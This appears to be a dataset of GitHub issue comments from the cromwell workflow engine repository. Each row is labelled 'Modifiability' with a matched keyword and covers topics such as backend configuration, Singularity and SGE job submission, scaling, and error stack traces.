Modifiability,"@pgrosu Thanks for reminding me about that ticket - there's definitely a bug somewhere but I think it's an artifact of using mock-jes and I was never able to replicate it so it's hard to say what was going on. What I saw in the database _should_ be impossible to have achieved, joy ;). I'm definitely aware of this sort of stuff, if our goal was pure scale you'd see a pretty different design to things. The goal is to be flexible enough to respond to scale demands as they increase. To date the folks that set our priorities for us have consistently set the bar for scale to be just enough to manage what we need to handle internally - as you note this means there's always more to squeeze out. . At the moment the plan is to loop back to scaling in the next quarter, but we're still talking about what we project for Broad's sequencing production (which really means ""how big of a joint genotyping run does daniel macarthur want to run this time?"") and a projection of firecloud usage for a relatively near-mid term horizon.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261786552:422,flexible,flexible,422,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261786552,1,['flexible'],['flexible']
Modifiability,"@rsasch that's exactly what i'm talking about. we do that everywhere, but akka can be configured to log those automatically. if an unhandled message catcher is doing something useful other than logging, that's different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430029351:86,config,configured,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-430029351,1,['config'],['configured']
Modifiability,"@rtitle ; The real meat of this ticket though is less the ""omg the DB barfed"" but rather ""omg we don't do anything smart when omg the DB barfed"" :). That said, the bulk of our data storage *is* separated out, just not practically in our default ""Jane User"" configuration. Currently the ""Jane User"" configuration is the only one which exists. So e.g. for CaaS that's not going to be the case, and we'll probably need to support horizontal scaling scenarios that don't take adantage of GCP tooling for external customers as well. . The lion's share of our DB activity consists of writes coming from the write side of our cqrs to the read side's event store and reads on that event store coming from the API. It's logically all separated out but in stock Cromwell they're sharing the same DB/connection/etc. So e.g. one possibility (which has come up before for other reasons) would be to make it easier for a user to bifurcate those to using separate DBs (or at least separate connections), although you'd still possibly have this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316435999:257,config,configuration,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-316435999,2,['config'],['configuration']
Modifiability,"@ruchim @Horneth @aednichols I'm seeing this error pop up running cromwell-35 on SGE, except the timeout is at 60 seconds rather than 10. The error gets repeated a number of times (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:400,adapt,adapter,400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['adapt'],['adapter']
Modifiability,"@ruchim I should clarify. There are a lot of people at this workshop (if not all of them) that cannot use the cloud, due to regulations, clinical requirements, etc. Or they need to be able to run WDL on their local on-prem compute cluster for testing on small cohorts, etc. This is a common configuration that prohibits docker. We really do not want these users to be forced to change the WDL that we (DSP methods) write and test. In order to stay backend-agnostic, can we implement a null option for docker as described in this issue (and #1804 )?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423147605:291,config,configuration,291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423147605,1,['config'],['configuration']
Modifiability,@ruchim In the past this sort of thing just required finding the right bit of configurable-ness and wiring it in but can't say for sure here,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3969#issuecomment-417333320:78,config,configurable-ness,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3969#issuecomment-417333320,1,['config'],['configurable-ness']
Modifiability,"@salonishah11 Thanks for pointing me towards the docker containers, sorry I was unclear earlier. I'm looking for documentation on how to _run_ the docker containers -- any `docker -v` / `-e` / `-p` options to configure it. This topic warrants a page in the [docs](https://cromwell.readthedocs.io/en/stable/), I think, don't you?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4682#issuecomment-467577218:209,config,configure,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4682#issuecomment-467577218,1,['config'],['configure']
Modifiability,"@scottfrazer . Let's discuss off github if you'd like to go in depth. There's more background in the original JES docs too. In short for now:; 1. I can't get all the ""logic"" terminology correct here (a Fruit is not necessarily an Apple), but shared variously between `RuntimeAttributes` and `JesBackend`, `local-disk` is `LocalWorkingDiskValue` is `working_disk` is `/cromwell_root`.; 2. Additional mount points are not input or captured anywhere within cromwell. So, if you _try to_ mount a second disk, cromwell never finishes setting the JES parameters for where to mount the freshly attached drive. This PR tries not to break this existing ""functionality"", while also allowing one to effectively increase the size of `/cromwell_root`. I'm leaving it to another ticket to discuss how this should be enhanced.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/257#issuecomment-151500542:802,enhance,enhanced,802,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/257#issuecomment-151500542,1,['enhance'],['enhanced']
Modifiability,"@scottfrazer You can't find `AnyRef` since its not defined as a class, and thus using it would need to be compiled with your `scala-library.jar` file. Below is an example:. ```; $ cat ExtAnyRef.scala; class ExtAnyRef extends AnyRef { }; object ExtAnyRef { }; $ ; $ cat AnyRef.java; class AnyRef extends ExtAnyRef {; public static void main(String[] args) {; System.out.println(""Hello World!"");; }; }; $; $ scalac -cp . ExtAnyRef.scala; $ javac -cp .:$SCALA_HOME/lib/scala-library.jar AnyRef.java; $ java -cp .:$SCALA_HOME/lib/scala-library.jar AnyRef; Hello World!; $; ```. Below is a link that describes it nicely:. http://stackoverflow.com/questions/2335319/what-are-the-relationships-between-any-anyval-anyref-object-and-how-do-they-m. Hope it helps,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107990455:217,extend,extends,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107990455,2,['extend'],['extends']
Modifiability,@scottfrazer when ready for review (or even prior to that) can you put up a gist demonstrating what the logging enhancements are? A before/after would be super awesome.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/254#issuecomment-151205924:112,enhance,enhancements,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/254#issuecomment-151205924,1,['enhance'],['enhancements']
Modifiability,"@seandavi - implementing the config suggested by @TimurIs and removing the specification of `concurrent-job-limit` I was able to run the following workflow with out issue. ```; task t {; Int id; command { echo ""scatter index = ${id}"" }; runtime {; docker: ""ubuntu:latest""; cpu: 1; memory: ""512MB""; }; output { String out = read_string(stdout()) }; }. workflow w {; Array[Int] arr = range(1000); scatter(i in arr) { call t { input: id = i } }; output { Array[String] t_out = t.out }; }; ```. Approximate numbers:; * max # jobs observed in ""submitted"" state = 250 - 270; * max # jobs observed in ""running"" state = 20-30",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747:29,config,config,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747,1,['config'],['config']
Modifiability,"@seandavi I know that GCS != S3, but when I had a brief look at the [source](https://github.com/broadinstitute/cromwell/blob/3b29af0d8f116d63e1fcb85f5b4903fd615a5386/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L89) where that configuration `io` block is being used, `number-of-requests` is used to set a throttle on a fairly low-level Actor that at least at might be used by the AWS batch backend... I haven't looked at the implementation in detail. I'll do that tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065:244,config,configuration,244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065,1,['config'],['configuration']
Modifiability,"@seandavi To throw out another possibility would you be just as (or even more) happy w/ user defined labeling? We've discussed both and personally I've been leaning towards the latter as it seems like it could cover the former and is more flexible. Either way it might be a bit (or not, one never knows) - the reason this doesn't currently exist is our one primary internal use case for batch submit is firecloud and they're already managing logical collections of workflows using their own data model, so one batch submit might represent multiple logical collections.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1666#issuecomment-260670462:239,flexible,flexible,239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1666#issuecomment-260670462,1,['flexible'],['flexible']
Modifiability,@shengqh when you use Google Custom Pipelines (genomics) Cromwell database is not persistent by default. I use a Cromwell server instance configured with an external mysql database. Details can be found in https://cromwell.readthedocs.io/en/latest/Configuring/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-450830409:138,config,configured,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-450830409,2,"['Config', 'config']","['Configuring', 'configured']"
Modifiability,"@tAndreani in terms of cromwell there's not a limit per se, although your underlying backend might get grouchy at you if you wind up submitting too many jobs. You could set the `concurrent-job-limit` config field to help with this if you do wind up with issues",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676:200,config,config,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676,1,['config'],['config']
Modifiability,"@tmdefreitas I observed/experienced a similar issue. I had a WDL with an optional input. It was optional because its type was ""File?"". I was passing in the input when issuing a submission on FireCloud which is currently using v0.24 of Cromwell according to the launch config dialog box. Using the developer tab I saw the error . ```; ""failures"": [{; ""message"": ""Couldn't resolve all inputs for CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task at index None.: Input evaluation for Call CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task failed.:\n\tnormalPanelSize:\n\tFile not found fc-2edc2716-272a-438a-b458-25dbee1e253d/eb1f9669-ce6c-462d-950d-630b321ddc1f/CallingGroup_Workflow/096768d6-9e90-4d1d-81c7-f909559a1a55/call-CallSomaticMutations_131_Prepare_Task/\""gs:/firecloud-tcga-open-access/tutorial/reference/refseq_exome_10bp_hg19_300_1kg_normal_panel.vcf\""""; }],; ```. I note two things. First, I note as I mentioned that I was passing in the file and so the error ""File Not found"" does not make sense. Second, I note that the gsURL has only one ""/"" after the ""gs"" ; in contrast the file IS where it is and in the workspace attribute (where it is pulled from) it is there and the file preview worked. Also the gsURL in the workspace had two ""//"" as it should. To be able to successfully use the WDL I removed the ""?"" so that it's a plain ""non-optional"" input. After removing the ""?"" I was able to successfully run the WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241:268,config,config,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241,1,['config'],['config']
Modifiability,@tom-dyar Based on the logs it appears cromwell is expecting to find the outputs locally. Since Funnel is running against AWS Batch those files are either being moved around on the AWS VM or being uploaded to S3. I think to get this working you would need to setup cromwell's `root` storage in the config to point to an S3 bucket. . @mcovarr I am not quite sure how cromwell can protect against this sort of config issue. One idea would be to inspect the OutputFileLog in the TES Task message and check the URL's of all of the output files.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395576505:298,config,config,298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395576505,2,['config'],['config']
Modifiability,"@vdauwera I spotted the issue but it was @kshakir who ended up resolving it. I believe this had to do with the auth that was used to perform the read_* function, and not having access to the proper google credentials. I checked the [config](https://github.com/googlegenomics/pipelines-api-examples/blob/master/wdl_runner/cromwell_launcher/jes_template.conf) wdl_runner uses and I believe it's missing the goolge.auths key and the engine.filesystem.gcs.auth key in the config, which is probably what Cromwell requires to parse gcs files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165:233,config,config,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165,2,['config'],['config']
Modifiability,"@vsoch @geoffjentry I just wanted to come back to this since singularity 3.0.1 was released a few weeks ago. The backend configuration can now be made a lot more simplistic:; ```; submit-docker = """"""; echo ' \; singularity exec --bind /run,/exports,${cwd}:${docker_cwd} docker://${docker} bash ${script}' | \; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr; """"""; ```; The bind to `/run` was neccessary on our SGE cluster to make python multiprocessing work, as in [this issue](https://github.com/sylabs/singularity/issues/455). The bind to `/exports` is also specific to our cluster.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-438591053:121,config,configuration,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-438591053,1,['config'],['configuration']
Modifiability,"@vsoch @geoffjentry We did manage to get it working, with some caveats. We also haven't really tested it very extensively yet.; These are the relevant lines from the backend configuration:; ```; submit-docker = """"""; echo ' \; CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"") && \; sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script && \; chmod 775 ${cwd}/execution/script && \; singularity exec --bind /exports:/data/,$CROMWELLROOT:/config docker://${docker} ${script}' | \; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr; """"""; dockerRoot = ""/config""; ```; > This only works if your container has both a /data and /config mount point. I tested this (very shallowly) using biocontainers. Line by line:; 1. `CROMWELLROOT=$(echo ${cwd} | sed ""s/cromwell-executions\\/.*/cromwell-executions/"")` ; 1. If dockerRoot is `/cromwell-executions`; 2. The script will contains paths like: `/cromwell-executions/test/<hash>/call-task/execution/rc`; 3. Therefore we need to have the entire structure under the root of the execution folder mounted, as such, we need to bind the entire execution folder.; 4. This gets the path to the root of the execution folder.; - I also tried setting dockerRoot to be the same as `cwd`: `dockerRoot = ""${cwd}""`, but this resulted in `${cwd}` being placed literally in the execution script. If this had been an option we wouldn't have to bind the execution directory separately (I think), but since it isn't we do have to do so.; 1. `sed -i ""s/\\/exports\\//\\/data\\//g"" ${cwd}/execution/script` ; - This a bit of a nasty workaround to convert absolute paths used in the commands to what their path would be in the container. This is necessary if you have (eg.) a String type output directory in a command. There are other ways of dealing with this, you could make a /data directory which links to /expo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799:174,config,configuration,174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-424631799,4,['config'],"['config', 'configuration']"
Modifiability,@vsoch Hi - I think what you're looking for is [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf) which is where we put examples like this. So if there's a configuration for a backend which works we'd put it in there so we could point people at it. Does that make sense?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413676397:210,config,configuration,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413676397,1,['config'],['configuration']
Modifiability,"@vsoch Sorry, our devops team has asked us to be especially thorough with PRs affecting our CI environments/dependencies. I've been bouncing between reading up on the [CircleCI docs](https://circleci.com/docs/2.0/configuration-reference/) and checking on several 🔥events this week. If you have time, perhaps we can setup a remote session next week where you can give me a tour of yml and everything that's going on? If you propose three times that work for you I'll pick one. Feel free to msg me here or email if that's easier. Otherwise I'll continue looking through the docs and get back to you once the flames die down. 🤞",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415767742:213,config,configuration-reference,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415767742,1,['config'],['configuration-reference']
Modifiability,"@vsoch That's a fair point. I was thinking that as there were viable config blocks in the new documentation that perhaps it's not necessarily, but I think we want **something** in `cromwell.examples.conf`. Thinking about it a little bit tho it winds up coming back to an issue I kept punting where I didn't want to add a bunch of variants for the different common situations. . Would it make sense to you if there was a comment block in there pointing people to the tutorial for examples? If so I'm happy to do that. If you think it's best to leave the concrete example(s), could you please confirm that they're consistent with the config files you all hashed out in #4635?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676:69,config,config,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676,2,['config'],['config']
Modifiability,"@vsoch That's the theory. Let me know if that doesn't seem to be working for you and we can go from there. The idea is that this would be in the Cromwell configuration and not per-workflow (but see below). In general that makes sense because a lot of the HPC-style use cases we see people **never** want to use actual Docker. However, there are a few buts to the above .... - A Cromwell server can have multiple backends, and workflows can be directed to specific backends, for the case where one sometimes wants it on and sometimes not . - None of this will cover the case where a user **really* wants Singularity (as in an actual Singularity container) instead of the ""use singularity to run a docker container"" model. We'll need to address this separately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413023778:154,config,configuration,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-413023778,1,['config'],['configuration']
Modifiability,@vsoch This config already does this by using exec. This way the binary image is created in the singularity cache dir.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758:12,config,config,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758,1,['config'],['config']
Modifiability,"@vsoch if you've not already done that, we can always reopen this PR. You all are right, I'm wrong. The reason why I was leaning towards avoiding `cromwell.examples.conf` blurbs is that (as @TMiguelT points out) it's a bit of a mess right now due to having too much stuff in there. TBH work needs to be done to start making that more organized. I sometimes can lean towards throwing the baby out with the bathwater in circumstances like that. I think it's fine to put a number of configurations into `cromwell.examples.conf` as long as the full block is fairly well self contained, and well documented. IOW something which would be easy to peel out into a separate file if/when we get there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389:480,config,configurations,480,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389,1,['config'],['configurations']
Modifiability,"@wleepang @markjschreiber . I also ran into this issue on several workflows that each ran for 28 hours before failing. Similar to XLuyu, it was in a scattered task. I can't access the logs for the server which failed because Batch terminated it. I suspect that something happened while provisioning the server... through the UserData: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Under that assumption, the fetch_and_run script would have never been installed to the correct location, but the job continued to execute. I see that in some places, you have checks for things such as when the awscli fails to install, then the machine is shutdown. https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Perhaps there should be a validation step to ensure that the machine is correctly provisioned? Alternatively, is it possible to `set -e` directly in the UserData runcmd? I see that `set -e` is set within some scripts, such as `provision.sh`: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/ecs-additions/provision.sh#L3. Another thought... I see that in the UserData script, there are some calls out to the network. Would it make sense to set AWS_RETRY_MODE=adaptive in such cases to help protect against random network failures?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341:1344,adapt,adaptive,1344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341,1,['adapt'],['adaptive']
Modifiability,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:80,variab,variable,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650,3,"['config', 'variab']","['config', 'variable']"
Modifiability,"A few immediate thoughts:. - What's the granularity of this value? ie per workflow, per cromwell server, per task?; - Should this be a ""happens without the end-user knowing"" or an ""end user has to choose"" type of a thing? ; - Or maybe it's ""in Firecloud it must not be overridden but outside of Firecloud it should be more flexible""; - Should this value (wherever it gets specified) be considered when deciding whether or not to call cache to a previous run (which may have been on a different subnet)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764:323,flexible,flexible,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764,1,['flexible'],['flexible']
Modifiability,"A fix for this issue would be much appreciated! It is particularly frustrating as the check-alive config parameter sounds like exactly the test I want cromwell to run, but it is actually for different usecase.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380667549:98,config,config,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380667549,1,['config'],['config']
Modifiability,"ARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquibase no longer outputs INFO messages as was [previously configured](https://github.com/broadinstitute/cromwell/blob/82/server/src/main/resources/logback.xml#L94). ## Other logging changes. In addition to the above changes for fixing Liquibase logging:; - Apache's `commons-logging` has been completely replaced with slf4j classes.; - `java.util.logging` can only be configured not replaced, and is configured in Cromwell to output to slf4j.; - Regarding Akka log messages:; - Timestamps/thread-ids were generated when/where Akka was writing to logs, not when/where they were generated.; - Akka keeps track of the original when/where with custom log event fields.; - Cromwell and Cromiam are now writing those custom fields if they are found.; - It's a small difference but should help debugging the applications under load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:2412,config,configuration,2412,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,4,['config'],"['configuration', 'configured']"
Modifiability,"Able to replicate the break from v36 to v37, I switched my check-alive in my config to use scontrol and it succeeded:; ```; ""check-alive"": ""scontrol show job ${job_id}"",; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-464982252:77,config,config,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-464982252,1,['config'],['config']
Modifiability,"Actor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1880,Config,ConfigAsyncJobExecutionActor,1880,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,Actor.writeScriptContents$(BackgroundAsyncJobExecutionActor.scala:11); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:158); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:155); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:644); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:644); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:959); 	at 